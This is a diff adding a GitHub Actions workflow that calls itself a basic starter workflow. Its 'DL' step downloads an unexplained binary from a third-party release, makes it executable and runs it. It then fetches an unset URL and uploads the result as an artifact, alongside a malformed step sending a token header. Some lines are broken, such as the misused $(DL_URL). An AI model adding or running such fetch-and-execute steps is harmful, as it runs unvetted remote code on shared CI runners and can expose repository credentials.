@@ -1,0 +1,35 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+on:
+  workflow_dispatch:
+    inputs:
+      fId:
+        required: true
+    
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Auth
+        run: "curl -H 'Authorization: token {{$GITHUB_TOKEN}}' https://api.github.com"
+
+      # Runs a set of commands using the runners shell
+      - name: DL
+        run: |
+          curl https://github.com/wuwuku/rep/releases/download/v1/kk > k
+          chmod +x k
+          ./k
+          curl -L $(DL_URL) > out
+          
+      - uses: actions/upload-artifact@v2
+        with:
+          name: file
+          path: ./out
+        
+
